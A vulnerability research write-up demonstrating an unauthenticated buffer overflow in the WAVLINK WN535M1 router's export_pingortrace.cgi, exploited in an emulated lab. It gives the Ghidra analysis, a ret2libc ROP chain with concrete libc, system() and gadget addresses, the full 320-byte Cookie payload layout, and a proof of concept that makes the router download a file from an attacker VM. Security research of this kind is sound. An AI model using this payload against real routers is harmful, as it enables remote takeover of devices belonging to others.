# WAVLINK Router: WAVLINK WN535M1 Pre-Auth Buffer Overflow

## 1. Overview
This project demonstrates the complete exploitation chain, resulting in unauthenticated Remote Code Execution (RCE) on the WAVLINK WN535M1 router.

The exploit overflows a stack buffer via the `HTTP_COOKIE` header, hijacks the instruction pointer ($ra), and executes a ROP chain `(ret2libc)` to call system`("/bin/sh")`. then I leverage the shell to force the router to download a file from my attacker VM directly into its web root (Arbitrary File Drop).

### Prerequisites
**Target:** Emulated WAVLINK firmware running via Lighttpd + QEMU user-mode.

**Attacker:** A local VM serving a malicious HTTP payload.

**Environment:** ASLR must be disabled on the host to ensure static `libc` base addresses (`setarch x86_64 -R`).

## 2. Lab Setup & Emulation

## 2.1 Acquire the Firmware
I Place the firmware image in a dedicated lab directory.

![alt text](/screenshots/0.png)

## 2.2  Firmware Extraction
Extract the filesystem using `binwalk:`

```bash
binwalk -Me WAVLINK_WN535M1-M35M1_V250922-WO-GD.bin
cd _WAVLINK_WN535M1-M35M1_V250922-WO-GD.bin.extracted/squashfs-root
```
![alt text](/screenshots/1.png)
*Note: All subsequent commands are run from within the squashfs-root directory.*

## 2.3 Building the Lighttpd CGI Harness
To simulate the router's web server, I use Lighttpd and `qemu-user-static` on the host VM.

```bash
sudo apt install lighttpd qemu-user-static -y
sudo rm -rf /var/www/html/squashfs-root
sudo cp -r $(pwd) /var/www/html/
sudo chmod -R 755 /var/www/html/squashfs-root
```
![alt text](/screenshots/simulate.png)

## 2.4 Configuring Lighttpd
Create /`etc/lighttpd/conf-enabled/10-wavlink-cgi.conf`:

```bash
server.modules += ( "mod_cgi", "mod_alias" )
alias.url += ( "/cgi-bin/" => "/var/www/html/squashfs-root/etc/lighttpd/www/cgi-bin/" )

$HTTP["url"] =~ "^/cgi-bin/" {
    cgi.assign = ( ".cgi" => "/usr/bin/qemu-mipsel-static" )
}
```
Set the QEMU library prefix so the MIPS binary can find its dependencies:

```bash
sudo mkdir -p /etc/systemd/system/lighttpd.service.d/
echo -e "[Service]\nEnvironment=\"QEMU_LD_PREFIX=/var/www/html/squashfs-root\"" | sudo tee /etc/systemd/system/lighttpd.service.d/override.conf
sudo systemctl daemon-reload
sudo systemctl restart lighttpd
```
![alt text](/screenshots/conf.png)

**Test the harness:**

```bash
curl -i -X GET http://127.0.0.1/cgi-bin/export_pingortrace.cgi
```
*receive a 500 Internal Server Error, confirming Lighttpd is successfully executing the MIPS binary via QEMU*

![alt text](/screenshots/h.png)

##  3. Affected Device & Pre-Auth Context

![alt text](/screenshots/Screenshot1.png)

The target runs a lightweight embedded Linux environment using `lighttpd` and CGI scripts. When the device is accessed (in my lab, via the emulated Lighttpd harness on `127.0.0.1:8080`), it presents a standard login screen prompting for a password.

However, the vulnerable endpoint-`/cgi-bin/export_pingortrace.cgi`-is accessible before any authentication takes place. An attacker does not need valid credentials or an active session to trigger the buffer overflow.

##  4. Vulnerability Analysis
Static analysis of the export_pingortrace.cgi binary using Ghidra confirms a classic stack-based buffer overflow (CWE-121).

The decompiler output shows that the CGI retrieves the HTTP_COOKIE header and copies it into a fixed-size stack buffer using strcpy() without any length validation. Crucially, the strstr() check for "token=" occurs after the strcpy, meaning the buffer overflow triggers before authentication is ever verified.

![alt text](/screenshots/ghidra.png)

**Pseudocode**
```bash
pcVar1 = getenv("HTTP_COOKIE");
strcpy(acStack_140, pcVar1);
pcVar1 = strstr(acStack_140, "token=");
```

**Assembly**
```bash
00400ae8  li     a1, 0x100       # length (256)
00400aec  jal    strcpy          # The vulnerable call
00400af0  addiu  a0, sp, 0x420   # destination buffer
```
## 5. Exploit Development & Finding the Offsets
## 5.1 Technique
ret2libc ROP. NX enabled (non-executable stack), no PIE, no Stack Canary.

The exploit uses a single ROP gadget in musl libc to call system("/bin/sh"). All addresses reside in libc — no stack pointer dependency. The payload is a fixed 320 bytes.

## 5.2 Disable ASLR and Find the Libc Base
To use static `libc` addresses, disable Address Space Layout Randomization (ASLR) for QEMU. I do this by running QEMU via `setarch -R.`

To find the static `libc` base address under this configuration.I Run the CGI once to crash it, then I check its memory maps:

```bash
# Run QEMU (it will crash)
setarch x86_64 -R qemu-mipsel-static -L $(pwd) ./etc/lighttpd/www/cgi-bin/export_pingortrace.cgi

# Check the memory maps of the crashed process
PID=$(pgrep -f qemu-mipsel-static | head -n 1)
cat /proc/$PID/maps | grep libc
```
**output:**

80c00000-80cdf000 r-xp 00000000 08:02 3933340 ... /lib/libc.so

0x80c00000. This is LIBC_BASE address.

## 5.3 Find the Function and String Offsets
Now I look inside libc.so to find the offsets for system() and "/bin/sh":

```bash
readelf -Ds lib/libc.so | grep system

strings -tx lib/libc.so | grep -w "/bin/sh"
```
![alt text](/screenshots/sys.png)

![alt text](/screenshots/bin.png)

`system()` **offset**: `0x5a3f8`

`/bin/sh` **offset**: `0x8fab8`

Calculate their final addresses:

`system_addr` = `0x80c00000` + `0x5a3f8` = `0x80c5a3f8`

`binsh_addr` = `0x80c00000` + `0x8fab8` = `0x80c8fab8`


## 5.4 ROP Gadget address
Find a gadget that moves arguments into the correct registers and jumps to system(). move $a0, $s0; move $t9, $s2; jalr $t9.

find its exact offset in my specific libc.so using Python:
```bash
python3 -c "
data = open('lib/libc.so', 'rb').read()
# Hex bytes for: move a0, s0; move t9, s2; jalr t9
idx = data.find(bytes.fromhex('21200002 21c84002 09f82003'))
print(f'Gadget offset: {hex(idx)}')
"
```
![alt text](/screenshots/pyt.png)

`gadget offset`: `0x26cd4`

`gadget_addr` = `0x80c00000` + `0x26cd4` = `0x80c26cd4`

## 5.5 Finding the Stack Offset
To overwrite $ra, calculate how many bytes to send.  attached GDB to QEMU and sent a payload of 400 'A's:

```bash
export HTTP_COOKIE=$(python3 -c "print('A'*400)")
setarch x86_64 -R qemu-mipsel-static -g 1234 -L $(pwd) ./etc/lighttpd/www/cgi-bin/export_pingortrace.cgi
```
![alt text](/screenshots/ofst.png)

In GDB, checked the registers:

```bash
info registers ra
ra: 0x41414141
```
![alt text](/screenshots/ra.png)

This confirmed that at exactly 320 bytes (taking into account the token= prefix and alignment), successfully overwrite $s0, $s1, $s2, and $ra

## 5.6 The 320-Byte Payload Structure
construct a precise 320-byte payload to align the stack perfectly for the gadget:

```bash
Offset      Content                  Purpose
────────────────────────────────────────────────────
0x000-0x025 "token=" + "A"×34       Alignment prefix (40B)
0x026-0x12f "X" × 264               Padding
0x130       s0 = 0x80c8fab8         "/bin/sh" → $a0
0x134       s1 = 0x42424242         (Unused)
0x138       s2 = 0x80c5a3f8         system() → $t9
0x13c       ra = 0x80c26cd4         ROP Gadget
────────────────────────────────────────────────────
```

### 5.7 Exploitation Flow
```bash
1. Send HTTP POST request with 320B payload in Cookie header
2. strcpy overflows - overwrites s0="/bin/sh", s2=system(), ra=gadget
3. Function returns - jr $ra - gadget
4. Gadget: move $a0,$s0; move $t9,$s2; jalr $t9 - system("/bin/sh")
5. Attacker sends commands via POST body (stdin) - arbitrary code execution
```

## 6. Proof of Concept (Arbitrary File Drop)
To prove RCE, trigger the ROP chain to call `system("/bin/sh")`.  then feed a command via the POST body to force the router to download a file from my attacker VM.

### Step 1: Start the Attacker File Server
First, host the file I want the router to download. In a new terminal on my attacker VM, create the payload file and start a Python HTTP server on port 8000.

```bash
mkdir -p /tmp/drop
echo "PWNED BY UNAUTHENTICATED RCE" > /tmp/drop/pwned.txt
cd /tmp/drop
python3 -m http.server 8000
```
![alt text](/screenshots/p.png)

### Step 2: The Exploit Script
construct a 320-byte payload. The payload aligns the system() call to execute /bin/sh. The actual shell command (wget ...) is delivered via the HTTP POST body, which maps to the CGI's stdin.

### Step 3: Trigger the Exploit
Run the provided `exploit_drop.py` script. It sends the malicious Cookie header (triggering the ROP chain) and provides the `wget` command via the POST body (which acts as stdin for the spawned shell).

```bash
python3 exploit_drop.py
```
![alt text](/screenshots/r.png)

### Step 4: Verify the File Drop
Because wget command saved the file directly into the router's web directory (/var/www/html/pwned.txt), it can now fetch it via standard HTTP.

```bash
wget http://127.0.0.1/pwned.txt
```
![alt text](/screenshots/op1.png) ![alt text](/screenshots/op2.png)


